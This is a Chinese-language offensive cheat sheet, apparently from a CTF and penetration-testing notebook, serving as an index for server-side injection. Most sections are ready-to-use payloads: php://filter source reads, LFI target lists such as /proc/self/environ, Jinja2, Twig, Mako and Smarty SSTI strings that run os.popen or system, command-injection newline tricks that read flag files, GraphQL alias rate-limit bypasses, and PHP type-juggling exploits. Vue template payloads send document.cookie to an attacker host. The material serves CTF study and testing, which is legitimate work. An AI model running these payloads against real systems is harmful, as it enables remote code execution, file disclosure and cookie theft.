---

phase: webapp
vuln_class: [injection, ssti, lfi, command-injection, ssrf, graphql]
title: 服务端注入总入口
summary: 注入的判据只有一条：用户输入是否进入了「被当作代码/指令解释」的位置。本篇是注入类总入口 + 各语言/引擎的独有原语；SQL、XXE、SSRF、反序列化、表达式注入各有专项篇。
---

# 服务端注入总入口

**专项篇**（细节以它们为准，本篇不重复）：
- SQL 注入 → [[web/漏洞分类/注入类/sql-injection.md|sql-injection.md]]
- XXE → [[web/漏洞分类/XXE/XXE测试.md|XXE测试]]
- SSRF → [[web/漏洞分类/SSRF/SSRF测试.md|SSRF测试]]
- 反序列化 → [[web/漏洞分类/注入类/server-side-deser.md|server-side-deser.md]] / [[web/漏洞分类/反序列化/反序列化测试.md|反序列化测试]]
- 表达式注入（EL/SpEL/OGNL）→ [EL 表达式注入测试](../表达式注入/EL 表达式注入测试.md)
- 代码执行（Ruby/Perl/LaTeX/Prolog/preg_replace /e/文件上传）→ [[web/漏洞分类/注入类/server-side-exec.md|server-side-exec.md]]
- 冷门语言与 CVE 链 → [[web/漏洞分类/注入类/server-side-advanced.md|server-side-advanced.md]]

## 0. 判据速查

| 输入去了哪 | 说明 | 去哪节 |
|---|---|---|
| `include()` / `require()` / 模板路径 | 文件包含，读源码或日志投毒 | §1 |
| `str.format()` / f-string | 属性遍历，不是 SSTI 但同样致命 | §2 |
| 模板引擎的模板字符串（非变量） | SSTI，按引擎选 payload | §3 |
| 字符串拼进 shell | 命令注入，重点是**分隔符全集** | §4 |
| 字符串拼进 GraphQL 文档 | GraphQL 注入 + 内省 | §5 |
| 用户输入进 `$$var` / `uniqid()` / 正则替换链 | PHP 特有原语 | §6 |
| 哈希函数的参数被强制成数组 | PHP 返回 NULL → 后续计算可预测 | §7 |
| 过滤逻辑本身写错（strpos、类型转换、INF） | 过滤绕过 | §8 |

**核心判据**：注入的本质是「**数据和代码的边界没划清**」。判断一个点是注入还是安全，只看一件事：用户输入是否会被某个解释器（PHP/Python/Shell/模板/SQL/GraphQL）**重新解析**。

---

## 1. 文件包含与源码泄露

```php
// 漏洞形态：include($_GET['page'] . ".php");
```

### 1.1 读源码：`php://filter`

```bash
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# 返回 PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# <?php $password = "s3cr3t"; ...
```

**为什么必须 base64**：直接 include 会被 PHP 执行，拿不到源码；base64 编码后内容是纯文本，不会被执行。

### 1.2 常用 LFI 目标

```
/etc/passwd                          # 用户枚举
/proc/self/environ                   # 环境变量（常含密钥）
/proc/self/cmdline                   # 进程命令行
/proc/self/maps                      # 内存布局（配合 /proc/self/mem）
/var/log/apache2/access.log          # 日志投毒入口
/var/www/html/config.php             # 应用密钥
```

### 1.3 过滤绕过

**递归替换残留**：`str_replace('../','',$path)` 只跑一次时，`....//` 中间含一个 `../`，删掉后两侧拼成新的 `../`：

```
Accept-Language: ....//....//....//....//flag
           →     ../ ../ ../ ../flag
```

Windows 下对应 `....\\\\`。

**`(int)` 转换只看数字前缀**：

```php
(int) "-4133353959107185265/../../admin"   // → -4133353959107185265
```

校验过了，但原始串带着穿越：

```
id=-4133353959107185265/../../admin
```

**判据**：任何「转换后再校验、但用原始串拼路径」的代码都可绕。修法是校验时就用 `^-?\d+$` 严格匹配原串。

（题目例证：35C3 CTF 2018 — flags / Not(e) accessible）

### 1.4 `strpos` 是识别不是校验

```php
if (strpos($file, '/etc/passwd') == true) die();
```

`strpos` 返回**位置**或 `false`。只拦「含这个字面串」的路径，换一个目标文件就过。更微妙的版本：`== true` 让偏移 `>=1` 的匹配被拦、偏移 `0` 的匹配放行。

**修法**：`realpath()` 后与白名单根目录比较。

（题目例证：TUCTF 2018）

---

## 2. `str.format()` 属性遍历

不是 SSTI（不需要模板引擎），只要用户输入是 format 字符串：

```python
greeting = user_input.format(current_user)
```

就能遍历对象图：

```python
"{0.__class__.__mro__}"
"{0.__class__.__init__.__globals__}"
"{0[secret_key]}"                  # 字典键
"{0.__class__.__mro__[1].__subclasses__()}"
```

**与 `%s` 的区别**：`%s` 只能取值，`.format()` 支持点号属性遍历和方括号索引 —— 这是它能泄密的原因。

**判据**：Flask/Django 视图里 `user_input.format(model_obj)` 或 `template_str.format(request)`。

（题目例证：PlaidCTF 2017）

---

## 3. SSTI：先认引擎，再选 payload

### 3.1 认引擎（最重要的一步）

发 `{{7*7}}` 和 `${7*7}` 和 `<%= 7*7 %>`，看哪个变 49：

| 探测 | 结果 | 引擎 |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | `7777777` | **Twig**（字符串重复） |
| `{{7*'7'}}` | `49` | **Jinja2**（转数字） |
| `${7*7}` | `49` | Mako / JSP EL / Freemarker |
| `<%= 7*7 %>` | `49` | ERB（Ruby）/ EJS（JS） |
| `#{7*7}` | `49` | Ruby 插值 |

**`{{7*'7'}}` 是区分 Twig 和 Jinja2 的唯一可靠判据**，别靠报错猜。

### 3.2 Jinja2

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

引号被过滤时用 bytes 拼字符串：

```python
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}
```

**引号全禁时用关键字参数**（`func(key=value)` 不需要引号）：

```python
{{player.__dict__.update(power_level=9999999) or player.name}}
```

`dict.update()` 返回 `None`（假值），`or` 让 Jinja2 转而渲染 `player.name`；属性修改在会话内持续生效。

（题目例证：ApoorvCTF 2026 — KameHame-Hack）

### 3.3 Twig

```twig
{{7*'7'}}                                  {# 7777777，确认是 Twig #}

{{'/etc/passwd'|file_excerpt(1,30)}}       {# 文件读 #}

{# Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# Twig 3.x：_self.env 已移除，走 filter #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

### 3.4 Mako（Python，无沙箱）

```python
${7*7}                                     # 检测

<%                                        # 直接执行 Python
  import os
  os.popen("id").read()
%>

${__import__('os').popen('cat /flag.txt').read()}   # 一行
```

**Mako 不需要类遍历** —— `${}` 和 `<% %>` 里就是原生 Python。

### 3.5 EJS（Node）

```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(r=>r.col1+r.col2).join(" ") %>
```

### 3.6 ERB（Ruby/Sinatra）+ Sequel

沙箱常限制 `DB` / `DATABASE` 常量，但 `Sequel::DATABASES` 这个全局数组没人管：

```bash
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore      # 确认 49
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...       # → [:players]
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**判据**：基于变量名的黑名单挡不住「另一个名字指向同一对象」。`Sequel::DATABASES`、`ActiveRecord::Base.connection` 都是同类。

（题目例证：BearCatCTF 2026 — Treasure Hunt 5）

### 3.7 Smarty 注释注入（CVE-2017-1000480）

Smarty 3 < 3.1.32 把模板源路径写进编译产物的 PHP 注释里。路径可控且 `*/` 未净化时：

```
http://target/?id=*/echo file_get_contents('/flag');/*
```

编译成：

```php
<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
// → /* 注释到此结束 → echo 执行 → /* 重新开注释
```

```bash
curl "http://target/?id=*/system('id');/*"
curl "http://target/?id=*/echo \`cat /flag\`;/*"    # 括号被过滤时用反引号
```

**判据**：只在**自定义 Smarty resource**（模板名来自用户输入）时成立，默认文件 resource 不受影响。

（题目例证：Insomni'hack 2018）

### 3.8 Vue.js 客户端模板注入

用户输入被渲染进 Vue 模板时，表达式求值器会执行 JS：

```javascript
${toString.constructor('document.location="http://attacker/?"+document.cookie')()}
{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}
{{_c.constructor('return 1')()}}          // _c = createElement，确认在 Vue 上下文
```

```javascript
// Vue 2.x
{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}
// Vue 3.x 沙箱更严，但 constructor 链常仍可用
{{(_=toString.constructor('return document'))().cookie}}
```

**判据**：页面引了 Vue 且有 `{{ }}` / `v-bind` 反射。`constructor` 属性在任意对象上都能拿到 `Function`，关键词过滤挡不住。

（题目例证：VolgaCTF 2018）

### 3.9 Go template

```go
{{.ReadFile "/flag.txt"}}
```

**注意**：Go 的 `text/template` **没有**文件读内置函数。这条 payload 能成，说明应用自己在 `FuncMap` 里注册了 `ReadFile`（`template.New("x").Funcs(template.FuncMap{"ReadFile": os.ReadFile})`）。所以它是「确认存在自定义函数」而非默认行为 —— 别拿它当通用 payload。

---

## 4. 命令注入

### 4.1 分隔符全集（比 payload 更重要）

```
;   |   ||   &   &&   $()   ``   \n (0x0a)   \r (0x0d)
```

**换行最容易被漏**：`;`、`|`、`&` 常被过滤，但 `\n` 在 shell 里同样是命令分隔符，且在 URL 里合法。

```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### 4.2 黑名单不全时的替代命令

```
cat   →  sed -n p flag.txt / awk '{print}' / tac / more / head / tail / od / xxd / strings
空格  →  ${IFS} / $IFS / <  / %09(tab)
```

### 4.3 CLI 工具的参数注入

**git 加反引号拼接**：过滤了 `< > | ; &` 但漏了换行：

```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

解码后：

```bash
git show "test"
cat /home/ctf/flag.txt
echo ""
```

```ruby
path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
```

**判据**：应用 shell 调用 git/svn 等 CLI，且做了「部分」净化。测 `%0a` 和 `%0d%0a`。

（题目例证：BSidesSF 2026 — gitfab）

### 4.4 sendmail 参数注入

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

```bash
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

`-bp` 让 sendmail 进队列打印模式（非交互），`|` 接到 shell。发现链：找 `.cgi_bak` 备份读源码。

（题目例证：SECCON 2015）

### 4.5 视觉数据里的注入：多条形码拼接

一个图片里有多个条形码时，zbar/zxing 会把**所有**结果拼成一个串。类型校验（如「必须是 UPC」）常只看第一个：

1. 生成合法 UPC/EAN-13（过类型校验）
2. 生成 Code128，内容带 shell 元字符：
   ```
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. 拼成一张图：`montage valid.png malicious.png -tile 2x1 combined.png`
4. 上传 → 拼接结果进 `system()` 或 JSON 解析器

```bash
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
```

**判据**：这是「视觉数据版的参数污染」。任何「扫描多个元素后拼接」的处理链都要试。

（题目例证：BSidesSF 2024）

---

## 5. GraphQL

### 5.1 内省

```graphql
{__schema{types{name,fields{name,args{name,type{name}}}}}}
{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
{__schema{types{name,kind,description}}}          # 找隐藏类型
```

### 5.2 批量与别名绕过限速

```graphql
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
}
```

数组批量（若支持）：

```json
[{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}]
```

**判据**：限速按「请求数」算而不按「操作数」算时，别名和批量直接绕过。

### 5.3 字符串插值注入

```javascript
const query = `mutation { doAction(input: "${userInput}") { result } }`;
```

```
userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
```

生成：

```graphql
mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
```

**判据**：服务端用模板字符串拼 GraphQL 文档（而非用变量 `$var` + variables 参数）就是注入。

---

## 6. PHP 特有原语

### 6.1 变量变量 `$$`

```php
foreach ($_GET as $key => $value) {
    $$key = $$value;      // key="_200", value="flag" → $_200 = $flag
}
// 之后 echo $_200;
```

```bash
curl "http://target/page.php?_200=flag"
```

**怎么找输出变量**：源码里找以 HTTP 状态码命名的变量（`$_200`、`$_404`），或任何下划线开头且被 echo 的变量。

**判据**：`$$key = $$value` 让攻击者能把受保护变量重定向到任意可控变量。

（题目例证：bugs_bunny 2017）

### 6.2 `uniqid()` 可预测文件名

`uniqid()` 内部用 `gettimeofday()`，**前 8 个 hex 字符就是 Unix 时间戳（秒）**。

```python
start_ts = int(time.time()) - 60
for ts in range(start_ts, int(time.time()) + 10):
    url = f'http://target/uploads/{format(ts, "08x")}_flag.txt'
    if requests.get(url).status_code == 200:
        print(url); break
```

**收窄窗口**：触发文件创建时记录服务端 `Date` 响应头，文件名里的时间戳就是那一秒。爆破量通常 < 100 次。

（题目例证：EKOPARTY 2017）

### 6.3 顺序正则替换的自我重建

```php
$input = preg_replace('/on\w+=\S+/', '', $input);    // 第一遍：去事件处理器
$input = preg_replace('/<script[^>]*>/', '', $input); // 第二遍：去 script 标签
```

把危险标签嵌进被拦模式里，删除后自动拼回：

```
输入: <scr<script>ipt>
第二遍删掉内层 <script> → 剩 <script>
```

**判据**：净化是多遍串行的、且每遍都能产生下一遍要拦的模式。修法是单遍幂等或改用解析器。

（题目例证：Tokyo Westerns 2017）

### 6.4 `hash_hmac` 收到数组返回 NULL

```php
$mac = hash_hmac('sha256', $_POST['nonce'], $secret);   // $nonce 是数组 → 返回 NULL
$token = hash_hmac('sha256', 'gimmeflag', $mac);        // key 变成 NULL → 等价空串
```

```python
# 预计算：PHP 里 hash_hmac('sha256','gimmeflag',NULL) == Python 的空 key HMAC
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()

requests.post("http://target/getflag",
              data={"nonce[]": "x", "token": known_token})
```

**判据**：任何「参数能否变成数组」的检查（`param[]=value`）。同类：`md5(array())`、`sha1(array())` 都返回 `NULL`。**链式哈希**（一个哈希的输出当下一个的 key）遇到 NULL 就整条可预测。

（题目例证：AceBear 2018）

---

## 7. 过滤逻辑本身写错

### 7.1 `INF == INF`

```php
$a = hash('sha256', $a);            // 64 位 hex 字符串
$a = (log10($a ** 0.5)) ** 2;       // "a..." ** 0.5 → INF；log10(INF) → INF
if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* 过 */ }
```

只要 `$c*$c + $d*$d` 也是 INF 就成立。`7e1000` 超过 `DBL_MAX` 即 INF：

```
val3=1&val4=7E1000
```

### 7.2 递归 `urldecode` 循环

要求 `$b != urldecode($b)` 连续十次，且最终等于 `"WoAHh!"`。`%25` 解成 `%`，把首字符编十层：

```
WoAHh! → %57oAHh! → %2557oAHh! → ... → %2525252525252525252557oAHh!
```

```bash
curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
```

**判据**：PHP 浮点比较接受 `INF == INF`，任何数学等式只要能把两边推到 `DBL_MAX` 以上就成立。哈希串转浮点会塌成 0 或 INF，`** 0.5` 和 `log*()` 是经典 juggling 原语。

（题目例证：Pragyan CTF 2019）

### 7.3 用户代理门控

`/robots.txt` 按 `User-Agent` 返回不同内容 —— 爬虫看到真的 `Disallow` 列表，人类看到诱饵：

```bash
curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
     http://target/robots.txt
```

轮换常见爬虫 UA：

```bash
for UA in 'Googlebot/2.1' \
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
  'facebookexternalhit/1.1' 'Slackbot-LinkExpanding 1.0' 'Twitterbot/1.0'; do
  echo "=== $UA ==="; curl -s -A "$UA" http://target/robots.txt
done
```

**判据**：`robots.txt`、`sitemap.xml`、`/.well-known/*`、首页都可能按 UA 分流。同一招也用于绕付费墙和只按 UA 放行的 WAF。

（题目例证：TAMUctf 2019 — Robots Rule）

---

## 8. 纪律

- **先认引擎/解释器，再选 payload**。SSTI 盲试 payload 是最浪费时间的做法，`{{7*7}}` / `{{7*'7'}}` / `${7*7}` 三个探针一次定引擎。
- **本篇是入口不是终点**。SQL/XXE/SSRF/反序列化/表达式注入都有专项篇，细节去那边看；本篇只保留它们没覆盖的原语。
- **命令注入先穷举分隔符，再想命令替代**。`\n` 被漏掉的概率远高于你想象。
- **PHP 的类型强制是系统性攻击面**。参数能变数组吗？能变浮点吗？能变 INF 吗？这三个问题覆盖大部分 PHP 逻辑绕过。
- **哈希当 key 的链式逻辑必查**。中间任一步能变 NULL，整条链就变成已知常量。
- **报的是「读到了源码 / 执行了命令」不是「有注入点」**。成果要落到具体数据或执行结果。
